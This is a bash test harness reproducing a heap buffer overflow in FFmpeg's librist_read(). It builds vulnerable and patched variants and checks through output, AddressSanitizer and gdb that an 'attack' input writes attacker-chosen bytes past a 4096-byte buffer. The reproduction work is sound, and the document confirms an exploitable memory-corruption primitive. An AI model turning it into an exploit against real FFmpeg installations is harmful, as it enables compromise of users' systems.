#!/bin/bash
# CVE-2026-75143 / GHSA-7qc3-xqxj-426p — FFmpeg librist_read() heap overflow.
# Every run re-extracts the complete verbatim librist_read() from four
# byte-exact pinned librist.c blobs, checks both SHA-256 manifests, builds
# plain and ASan variants, and drives rungs 1-4. No daemon, socket or network.
set -u
export ASAN_OPTIONS=detect_leaks=0
cd "$(dirname "$0")" || exit 99
E=evidence
mkdir -p "$E" vuln rel90 fixed rel901
rm -f "$E"/*.out "$E"/*.log "$E"/normalized.txt \
      vuln/*.inc rel90/*.inc fixed/*.inc rel901/*.inc \
      p-vuln p-rel90 p-fixed p-rel901 a-vuln-gcc a-fixed-gcc \
      a-rel90-gcc a-rel901-gcc a-vuln-clang

PASS=0
FAIL=0
ok() { PASS=$((PASS + 1)); printf 'PASS %s\n' "$1"; }
no() { FAIL=$((FAIL + 1)); printf 'FAIL %s\n' "$1"; }
has() {
    if grep -qF "$2" "$1" 2>/dev/null; then ok "$3"; else no "$3"; fi
}
hasnt() {
    if grep -qF "$2" "$1" 2>/dev/null; then no "$3"; else ok "$3"; fi
}
count() {
    if [ "$(grep -cF "$2" "$1" 2>/dev/null)" = "$3" ]; then ok "$4"; else no "$4"; fi
}
hasre() {
    if grep -qE "$2" "$1" 2>/dev/null; then ok "$3"; else no "$3"; fi
}

# --- verbatim slices: re-extracted from pinned bytes on every run ----------
V=../src/librist.c.7b05d16c
N=../src/librist.c.n9.0
F=../src/librist.c.1c10bcc2
R=../src/librist.c.n9.0.1
{ echo '#line 200 "librist.c.7b05d16c"';  sed -n '200,234p' "$V"; } > vuln/librist_read.inc
{ echo '#line 200 "librist.c.n9.0"';      sed -n '200,234p' "$N"; } > rel90/librist_read.inc
{ echo '#line 200 "librist.c.1c10bcc2"';  sed -n '200,234p' "$F"; } > fixed/librist_read.inc
{ echo '#line 200 "librist.c.n9.0.1"';    sed -n '200,234p' "$R"; } > rel901/librist_read.inc

(cd ../src && sha256sum -c SHA256SUMS) > "$E/hashcheck.out" 2>&1 \
  && ok "src-sha256-manifest" || no "src-sha256-manifest"
count "$E/hashcheck.out" ': OK' 7 'all-7-pinned-source-files-match'
sha256sum -c SHA256SUMS > "$E/hashcheck-harness.out" 2>&1 \
  && ok "harness-sha256-manifest" || no "harness-sha256-manifest"

count "$E/hashcheck-harness.out" ': OK' 13 'all-13-harness-and-pin-files-match'
count ../src/fix-1c10bcc2.patch 'size = FFMIN(data_block->payload_len, size);' 1 'fix-patch-clamps-callers-size'
count ../src/fix-1c10bcc2.patch 'honor the caller buffer size' 1 'fix-patch-subject-verbatim'
count vuln/librist_read.inc 'size = data_block->payload_len;' 1 'vuln-unclamped-size-verbatim'
count rel90/librist_read.inc 'size = data_block->payload_len;' 1 'n9.0-unclamped-size-verbatim'
count fixed/librist_read.inc 'size = FFMIN(data_block->payload_len, size);' 1 'fix-clamped-size-verbatim'
count rel901/librist_read.inc 'size = FFMIN(data_block->payload_len, size);' 1 'n9.0.1-clamped-size-verbatim'
count vuln/librist_read.inc 'memcpy(buf, data_block->payload, size);' 1 'vuln-memcpy-verbatim'
build_plain() {
    gcc -O0 -g -fno-stack-protector -DVARIANT_LABEL="\"$2\"" \
        -o "$3" driver.c "${@:4}" 2> "$E/build-$3.log"
}
build_asan() {
    gcc -O0 -g -fsanitize=address -fno-omit-frame-pointer \
        -DVARIANT_LABEL="\"$2\"" -o "$3" driver.c "${@:4}" 2>> "$E/build-asan.log"
}
build_plain vuln/librist_read.inc  vuln-7b05d16c   p-vuln    -DUSE_VULN -DSHOW_SMEAR
build_plain rel90/librist_read.inc release-n9.0    p-rel90   -DUSE_REL90 -DSHOW_SMEAR
build_plain fixed/librist_read.inc fixed-1c10bcc2  p-fixed   -DUSE_FIX -DSHOW_SMEAR
build_plain rel901/librist_read.inc release-n9.0.1 p-rel901  -DUSE_REL901 -DSHOW_SMEAR
for B in p-vuln p-rel90 p-fixed p-rel901; do
    if [ -x "$B" ]; then ok "build-$B"; else no "build-$B"; fi
done
build_asan vuln/librist_read.inc  vuln-7b05d16c   a-vuln-gcc  -DUSE_VULN
build_asan fixed/librist_read.inc fixed-1c10bcc2  a-fixed-gcc -DUSE_FIX
build_asan rel90/librist_read.inc release-n9.0    a-rel90-gcc -DUSE_REL90
build_asan rel901/librist_read.inc release-n9.0.1 a-rel901-gcc -DUSE_REL901
for B in a-vuln-gcc a-fixed-gcc a-rel90-gcc a-rel901-gcc; do
    if [ -x "$B" ]; then ok "build-$B"; else no "build-$B"; fi
done
if command -v clang >/dev/null 2>&1; then
    clang -O0 -g -fsanitize=address -fno-omit-frame-pointer \
        -DVARIANT_LABEL='"vuln-7b05d16c"' -DUSE_VULN \
        -o a-vuln-clang driver.c 2>> "$E/build-asan.log"
    if [ -x a-vuln-clang ]; then ok 'build-a-vuln-clang'; else no 'build-a-vuln-clang'; fi
fi

# --- rung 1: advisory arithmetic, no vulnerable call ------------------------
./p-vuln arith > "$E/arith-vuln.out" 2>&1
has "$E/arith-vuln.out" 'PAYLOAD_LEN=9972 CALLER_SIZE=4096 OVERFLOW_BYTES=5876 MAX_PAYLOAD_SIZE=9972' 'r1-advisory-arithmetic'
./p-rel90 arith > "$E/arith-rel90.out" 2>&1
has "$E/arith-rel90.out" 'OVERFLOW_BYTES=5876' 'r1-affected-release-arithmetic'
./p-fixed arith > "$E/arith-fixed.out" 2>&1
has "$E/arith-fixed.out" 'OVERFLOW_BYTES=5876' 'r1-fixed-blob-same-input-geometry'

# --- rung 2: vulnerable variants smear, fixed variants clamp ----------------
./p-vuln attack > "$E/plain-vuln-attack.out" 2>&1 || true
has "$E/plain-vuln-attack.out" 'VARIANT=vuln-7b05d16c MODE=attack PAYLOAD_LEN=9972 CALLER_SIZE=4096 RET=9972' 'r2-vuln-returns-full-payload'
has "$E/plain-vuln-attack.out" 'READ_CALLS=1 FREE_CALLS=1 LOG_CALLS=0' 'r2-vuln-normal-call-flow'
has "$E/plain-vuln-attack.out" 'BUF_IN_0=41 BUF_IN_17=5a BUF_AT_4095=41' 'r2-inbounds-copy'
hasre "$E/plain-vuln-attack.out" 'SINK_DIST=4[0-9]{3} SINK_BYTE_1=5a SINK_BYTE_8=7a' 'r4-vuln-adjacent-heap-object-corrupted'
has "$E/plain-vuln-attack.out" 'OBS_OFFSET_4096=41 OBS_OFFSET_4113=5a OBS_OFFSET_4120=7a OBS_OFFSET_4128=3c OBS_OFFSET_4136=7b OBS_OFFSET_4144=42 OBS_OFFSET_4152=7b OBS_OFFSET_4160=41' 'r4-vuln-chosen-bytes-past-caller-buffer'
has "$E/plain-vuln-attack.out" 'OBS_OFFSET_5000=41 OBS_OFFSET_9000=41' 'r4-vuln-deep-smear-attacker-controlled'
./p-rel90 attack > "$E/plain-rel90-attack.out" 2>&1 || true
has "$E/plain-rel90-attack.out" 'VARIANT=release-n9.0 MODE=attack PAYLOAD_LEN=9972 CALLER_SIZE=4096 RET=9972' 'r2-affected-release-n9.0'
hasre "$E/plain-rel90-attack.out" 'OBS_OFFSET_4113=5a .*OBS_OFFSET_4128=3c .*OBS_OFFSET_4160=41' 'r4-affected-release-chosen-bytes'
./p-fixed attack > "$E/plain-fixed-attack.out" 2>&1 || true
has "$E/plain-fixed-attack.out" 'VARIANT=fixed-1c10bcc2 MODE=attack PAYLOAD_LEN=9972 CALLER_SIZE=4096 RET=4096' 'r2-fixed-returns-clamped-size'
has "$E/plain-fixed-attack.out" 'OBS_OFFSET_4096=00 OBS_OFFSET_4113=cc OBS_OFFSET_4120=cc OBS_OFFSET_4128=cc OBS_OFFSET_4136=cc OBS_OFFSET_4144=cc OBS_OFFSET_4152=cc OBS_OFFSET_4160=cc' 'r2-fixed-no-bytes-past-caller-buffer'
./p-rel901 attack > "$E/plain-rel901-attack.out" 2>&1 || true
has "$E/plain-rel901-attack.out" 'VARIANT=release-n9.0.1 MODE=attack PAYLOAD_LEN=9972 CALLER_SIZE=4096 RET=4096' 'r2-patched-release-n9.0.1'
hasre "$E/plain-rel901-attack.out" 'OBS_OFFSET_4113=cc .*OBS_OFFSET_9000=cc' 'r2-patched-release-no-smear'

# existing guard: payload_len > MAX_PAYLOAD_SIZE rejects before the copy
for B in vuln rel90 fixed rel901; do
    ./p-$B oversize > "$E/plain-$B-oversize.out" 2>&1 || true
    has "$E/plain-$B-oversize.out" 'PAYLOAD_LEN=9973 CALLER_SIZE=4096 RET=-5' "$B-oversize-guard-rejects"
done

# --- rung 4: gdb shows the staged bytes and the attacker-chosen return -----
if command -v gdb >/dev/null 2>&1; then
    gdb -q -batch \
        -ex 'break librist.c.7b05d16c:233' -ex 'run attack' \
        -ex 'print size' -ex 'x/16bx buf+4108' -ex 'bt 2' \
        ./p-vuln > "$E/gdb-vuln.out" 2>&1
    has "$E/gdb-vuln.out" '$1 = 9972' 'r4-gdb-vuln-chosen-size'
    has "$E/gdb-vuln.out" '0x5a' 'r4-gdb-vuln-chosen-byte-5a'
    has "$E/gdb-vuln.out" '0x7a' 'r4-gdb-vuln-chosen-byte-7a'
    has "$E/gdb-vuln.out" 'librist_read' 'r4-gdb-vuln-frame-is-sink'
    gdb -q -batch \
        -ex 'break librist.c.1c10bcc2:233' -ex 'run attack' \
        -ex 'print size' -ex 'x/16bx buf+4108' -ex 'bt 2' \
        ./p-fixed > "$E/gdb-fixed.out" 2>&1
    has "$E/gdb-fixed.out" '$1 = 4096' 'r4-gdb-fixed-clamped-size'
    hasre "$E/gdb-fixed.out" '0xcc.*0xcc' 'r4-gdb-fixed-adjacent-object-intact'
else
    no 'gdb-unavailable'
fi

# --- rung 3: ASan WRITE of 9972 past a 4096-byte heap allocation ------------
./a-vuln-gcc attack > "$E/vuln-gcc-asan.out" 2>&1 || true
has "$E/vuln-gcc-asan.out" 'ERROR: AddressSanitizer: heap-buffer-overflow' 'r3-gcc-asan-overflow'
has "$E/vuln-gcc-asan.out" 'WRITE of size 9972' 'r3-gcc-asan-write9972'
has "$E/vuln-gcc-asan.out" 'librist.c.7b05d16c:230' 'r3-gcc-asan-at-pinned-line-230'
has "$E/vuln-gcc-asan.out" 'in librist_read' 'r3-gcc-asan-in-function'
has "$E/vuln-gcc-asan.out" '4096-byte region' 'r3-gcc-asan-victim-region'
if [ -x a-vuln-clang ]; then
    ./a-vuln-clang attack > "$E/vuln-clang-asan.out" 2>&1 || true
    has "$E/vuln-clang-asan.out" 'ERROR: AddressSanitizer: heap-buffer-overflow' 'r3-clang-asan-overflow'
    has "$E/vuln-clang-asan.out" 'WRITE of size 9972' 'r3-clang-asan-write9972'
    has "$E/vuln-clang-asan.out" 'librist.c.7b05d16c:230' 'r3-clang-asan-at-pinned-line-230'
fi
./a-rel90-gcc attack > "$E/rel90-gcc-asan.out" 2>&1 || true
has "$E/rel90-gcc-asan.out" 'WRITE of size 9972' 'r3-affected-release-asan'
./a-fixed-gcc attack > "$E/fixed-gcc-asan.out" 2>&1 || true
hasnt "$E/fixed-gcc-asan.out" 'ERROR: AddressSanitizer' 'fixed-asan-clean'
has "$E/fixed-gcc-asan.out" 'RET=4096' 'fixed-asan-bounded-copy'
./a-rel901-gcc attack > "$E/rel901-gcc-asan.out" 2>&1 || true
hasnt "$E/rel901-gcc-asan.out" 'ERROR: AddressSanitizer' 'rel901-asan-clean'
has "$E/rel901-gcc-asan.out" 'RET=4096' 'rel901-asan-bounded-copy'

# --- safe control: a 4-byte payload is in bounds in every variant -----------
for B in vuln fixed rel90 rel901; do
    ./p-$B safe > "$E/plain-$B-safe.out" 2>&1 || true
    has "$E/plain-$B-safe.out" 'MODE=safe PAYLOAD_LEN=4 CALLER_SIZE=4096 RET=4' "$B-safe-control"
done
for B in vuln-gcc fixed-gcc rel90-gcc rel901-gcc; do
    ./a-$B safe > "$E/$B-asan-safe.out" 2>&1 || true
    hasnt "$E/$B-asan-safe.out" 'ERROR: AddressSanitizer' "$B-asan-safe-clean"
done

# --- deterministic normalized trace: no PID, address, path or build id ------
{
    cat "$E/hashcheck.out" "$E/hashcheck-harness.out" \
        "$E/arith-vuln.out" "$E/arith-rel90.out" \
        "$E/plain-vuln-attack.out" "$E/plain-rel90-attack.out" \
        "$E/plain-fixed-attack.out" "$E/plain-rel901-attack.out" \
        "$E/plain-vuln-oversize.out" "$E/plain-fixed-oversize.out" \
        "$E/fixed-gcc-asan.out" "$E/rel901-gcc-asan.out" \
        "$E/vuln-gcc-asan.out" "$E/vuln-clang-asan.out" 2>/dev/null
    grep -E 'size = |0x41|0x5a|librist_read|librist.c\.' "$E/gdb-vuln.out" "$E/gdb-fixed.out" 2>/dev/null
} | sed -E 's#/[^ ]*/ffmpeg2shell/harness/#HARNESS/#g; s#/[^ ]*/harness/#HARNESS/#g; s/BuildId: [0-9a-f]+/BuildId: BUILDID/g; s/0x[0-9a-f]+/0xADDR/g; s/#[0-9]+ /#FRAME /g; s/==[0-9]+==/==PID==/g' > "$E/normalized.txt"
TRACE=$(sha256sum "$E/normalized.txt" | cut -d' ' -f1)
printf 'TRACE_SHA256=%s\n' "$TRACE"

printf 'PASS=%d FAIL=%d\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
